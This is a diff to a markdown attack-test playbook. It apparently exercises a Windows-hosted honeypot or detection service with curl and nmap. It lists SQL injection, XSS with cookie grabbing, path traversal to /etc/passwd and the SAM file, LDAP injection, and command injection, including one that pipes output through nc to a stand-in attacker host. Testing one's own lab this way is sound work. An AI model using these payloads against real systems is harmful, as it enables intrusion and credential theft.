@@ -5,6 +5,24 @@
 
 ---
 
+## ⚠️ IMPORTANT: Windows PowerShell Users
+
+**If running these commands FROM Windows PowerShell** (instead of from Kali), replace all `curl` with `curl.exe`:
+
+```powershell
+# ❌ WRONG (PowerShell alias - causes errors):
+curl -k "https://WINDOWS_IP:60000/api/threats?id=1"
+
+# ✅ CORRECT (actual curl binary):
+curl.exe -k "https://WINDOWS_IP:60000/api/threats?id=1"
+```
+
+**Reason:** PowerShell's `curl` is an alias for `Invoke-WebRequest`, not the actual curl binary. Use `curl.exe` to call the real curl command.
+
+**For Kali Linux:** All commands work as-is with `curl` (no `.exe` needed).
+
+---
+
 ## 0. Windows Preparation (Run as Administrator)
 
 **Before running attacks, enable ICMP on Windows:**
@@ -69,58 +87,58 @@ mysql -h WINDOWS_IP -P 3306 -u root -p
 # Test 1: Classic SQLi
 curl -k "https://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"
 
-# Test 2: UNION attack (URL-encoded comment works in both Kali and Windows)
-curl -k "https://WINDOWS_IP:60000/api/alerts?id=1 UNION SELECT * FROM users%2D%2D"
+# Test 2: UNION attack (using # for SQL comment - works on all platforms)
+curl -k "https://WINDOWS_IP:60000/api/alerts?id=1 UNION SELECT * FROM users#"
 
 # Test 3: Time-based blind
-curl -k "https://WINDOWS_IP:60000/api/reports?id=1' AND SLEEP(5)%2D%2D"
+curl -k "https://WINDOWS_IP:60000/api/reports?id=1' AND SLEEP(5)#"
 
 # Test 4: Boolean-based
-curl -k "https://WINDOWS_IP:60000/api/data?filter=admin' AND 1=1%2D%2D"
+curl -k "https://WINDOWS_IP:60000/api/data?filter=admin' AND 1=1#"
 ```
 
 ### XSS (Cross-Site Scripting)
 ```bash
-# Test 1: Reflected XSS (URL-encoded for compatibility)
-curl -k "https://WINDOWS_IP:60000/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
+# Test 1: Reflected XSS
+curl -k 'https://WINDOWS_IP:60000/api/search?q=<script>alert(1)</script>'
 
-# Test 2: DOM XSS (URL-encoded)
-curl -k "https://WINDOWS_IP:60000/api/alerts?msg=%3Cimg%20src=x%20onerror=alert(1)%3E"
+# Test 2: DOM XSS
+curl -k 'https://WINDOWS_IP:60000/api/alerts?msg=<img src=x onerror=alert(1)>'
 
-# Test 3: Stored XSS (POST body - no encoding needed)
-curl -k -X POST "https://WINDOWS_IP:60000/api/comments" -d "comment=<script>document.cookie</script>"
+# Test 3: Stored XSS
+curl -k -X POST 'https://WINDOWS_IP:60000/api/comments' -d 'comment=<script>document.cookie</script>'
 ```
 
 ### Path Traversal
 ```bash
-# Test 1: Linux path traversal (URL-encoded)
-curl -k "https://WINDOWS_IP:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+# Test 1: Linux path traversal
+curl -k 'https://WINDOWS_IP:60000/api/files?path=../../../../etc/passwd'
 
-# Test 2: Windows path traversal (URL-encoded backslashes)
-curl -k "https://WINDOWS_IP:60000/api/download?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam"
+# Test 2: Windows path traversal
+curl -k 'https://WINDOWS_IP:60000/api/download?file=..\..\..\windows\system32\config\sam'
 
-# Test 3: Encoded traversal (already encoded)
-curl -k "https://WINDOWS_IP:60000/api/logs?log=..%2F..%2F..%2Fetc%2Fpasswd"
+# Test 3: Encoded traversal
+curl -k 'https://WINDOWS_IP:60000/api/logs?log=..%2F..%2F..%2Fetc%2Fpasswd'
 ```
 
 ### Command Injection
 ```bash
-# Test 1: Basic command injection (semicolon encoded)
-curl -k "https://WINDOWS_IP:60000/api/ping?host=127.0.0.1%3B%20whoami"
+# Test 1: Basic command injection
+curl -k 'https://WINDOWS_IP:60000/api/ping?host=127.0.0.1;%20whoami'
 
-# Test 2: Piped commands (pipe encoded)
-curl -k "https://WINDOWS_IP:60000/api/exec?cmd=ls%20%7C%20nc%20attacker.com%204444"
+# Test 2: Piped commands
+curl -k 'https://WINDOWS_IP:60000/api/exec?cmd=ls%20|%20nc%20attacker.com%204444'
 
-# Test 3: Backtick execution (backtick encoded)
-curl -k "https://WINDOWS_IP:60000/api/utils?input=%60id%60"
+# Test 3: Backtick execution
+curl -k 'https://WINDOWS_IP:60000/api/utils?input=`id`'
 ```
 
 ### LDAP Injection
 ```bash
-# LDAP injection with special chars encoded
-curl -k "https://WINDOWS_IP:60000/api/login?username=admin*%29%28%26%28password=*"
+# LDAP injection with special characters
+curl -k 'https://WINDOWS_IP:60000/api/login?username=admin*)(&(password=*'
 
-curl -k "https://WINDOWS_IP:60000/api/auth?user=*%29%28uid=*%29%29%28%26%28uid=*"
+curl -k 'https://WINDOWS_IP:60000/api/auth?user=*)(uid=*))(&(uid=*'
 ```
 
 ### XXE (XML External Entity)
@@ -324,10 +342,10 @@ echo "=== Testing SQL Injection ==="
 curl -k "https://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"
 
 echo "=== Testing XSS ==="
-curl -k "https://WINDOWS_IP:60000/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
+curl -k 'https://WINDOWS_IP:60000/api/search?q=<script>alert(1)</script>'
 
 echo "=== Testing Path Traversal ==="
-curl -k "https://WINDOWS_IP:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+curl -k 'https://WINDOWS_IP:60000/api/files?path=../../../../etc/passwd'
 
 echo "=== Testing Port Scan ==="
 nmap -p 60000,2222,2323 WINDOWS_IP
